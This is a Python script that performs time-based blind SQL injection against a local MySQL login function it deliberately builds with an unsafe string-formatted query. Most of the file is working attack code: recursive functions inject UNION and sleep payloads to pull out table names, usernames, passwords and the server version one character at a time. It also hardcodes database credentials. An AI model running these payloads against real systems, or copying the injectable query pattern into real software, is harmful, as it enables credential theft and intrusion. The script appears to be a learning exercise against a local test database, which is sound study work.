import MySQLdb
import time

#The timing based query; uses the sleep to know what's going on.
"""
An example of the query:
SELECT *
    FROM Login
    WHERE user = "max"
    AND password = "A"
    UNION
    select 1,if(
        (SELECT table_name
        FROM information_schema.tables
        WHERE table_name like 'a%' LIMIT 1) IS NOT null,
        sleep(0.05), 'false') -- " ; comments are for escaping.
"""

"""
the database is named 'users'
Has one table in the datbase:
    username VARCHAR(50)
    password VARCHAR(50)
"""

def connection():
    #connections
    db = MySQLdb.connect(host="localhost",    # your host, usually localhost
                         user="root",         # your username
                         passwd="pwd",  # your password
                         db="users")        # name of the data base
    cur = db.cursor()

    # Use all the SQL you like
    cur.execute("SELECT DATABASE();")

    # print all the first cell of all the rows
    for row in cur.fetchall():
        print row[0]

    db.close()


"""
All of these functions are the same, besides that they look for a different item in the query
start_letter(string): the starting point, use "" most of the time
char_set(list of strings): the characters to check the database for. DON'T USE _ for this.
type_cap(int): just ignore this one
"""
#gets all tables with login_info here.
def find_tables(start_letter,char_set,type_cap):
    for char in char_set:
        start = time.time()

        #the query that does all of the magic!
        login("max","A \" UNION select 1,if((SELECT table_name FROM information_schema.tables WHERE table_name like '"+ start_letter + char + "%' LIMIT 1) IS NOT null, sleep(0.05), 'false') -- ", printed = 0)
        end = time.time()
        if( end - start >= 0.05):
            print(start_letter + char)
            find_tables(start_letter + char,char_set,type_cap)

#Gets all usernames from the Login table
def find_users(start_letter, char_set,type_cap):
    for char in char_set:
        start = time.time()
        login("max","A \" UNION select 1,if((SELECT user FROM Login WHERE user like '"+ start_letter + char + "%' LIMIT 1) IS NOT null, sleep(0.05), 'false') -- ", printed = 0)
        end = time.time()
        if( end - start >= 0.05):
            print(start_letter + char)
            find_users(start_letter + char,char_set,1)

#Gets all the passwords from the Login table
def find_passwords(start_letter,char_set,type_cap):
    for char in char_set:

        start = time.time()
        login("max","A \" UNION select 1,if((SELECT user FROM Login WHERE password like '"+ start_letter + char + "%' LIMIT 1) IS NOT null, sleep(0.05), 'false') -- ", printed = 0)
        end = time.time()
        if( end - start >= 0.05):
            print(start_letter + char)
            find_passwords(start_letter + char,char_set,type_cap)

#Scraping the version out of the database!
def get_version(start_letter,char_set,type_cap):
    for char in char_set:
        start = time.time()
        #the query that does all of the magic!
        login("max","A \" UNION SELECT 1,if((SELECT user FROM Login WHERE @@version like '"+ start_letter + char + "%' LIMIT 1) IS NOT NULL, sleep(0.1), 'false'); -- ", printed = 0)

        end = time.time()
        if( end - start >= 0.05):
            print(start_letter + char)
            get_version(start_letter + char,char_set,type_cap)


#The login function that we are executing to.
#username(string): the username to login in with.
#password(string): the password that trying to be logged in with.
#printed(int)(optional): whether to print out all of the information of the query, and login or not.
    # 1: print all. Anything else, print nothing.
def login(username,password, printed = 1):
    #connections
    db = MySQLdb.connect(host="localhost",    # your host, usually localhost
                         user="root",         # your username
                         passwd="Airjordan23",  # your password
                         db="user_fun")

    cur = db.cursor()
    query = """
    SELECT *
    FROM Login
    WHERE user = "%s"
    AND password = "%s" ;
    """ % (username,password)
    if(printed == 1):
        print query

    cur.execute(query)

    #displaying the information
    my_string = ""
    for row in cur.fetchall():
        my_string += row[0] + " " + row[1] + "\n"

    if(printed == 1):
        print my_string

    if(my_string != "" and printed == 1):
        print "Logged in"

#An example of the actual login script working
#login("mdulin2","""123456789""")

#An example of the actual login script rejecting
#login("mdulin2","""12345678""")

#login("mdulin2","""A" UNION select 1,if(user() like 'roo4t@%', sleep(5), 'false') -- """)

#login("max","""A " UNION select 1,if((SELECT table_name FROM information_schema.tables WHERE table_name like 's%' LIMIT 1) IS NOT null, sleep(1), 'false') -- """)

# the character set being used on the database
char_set = ['$','.','-','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']

#Finding the items from the tables
#find_tables("",char_set,65)
get_version("",char_set,65)
find_users("",char_set,65)
find_passwords("",char_set,65)
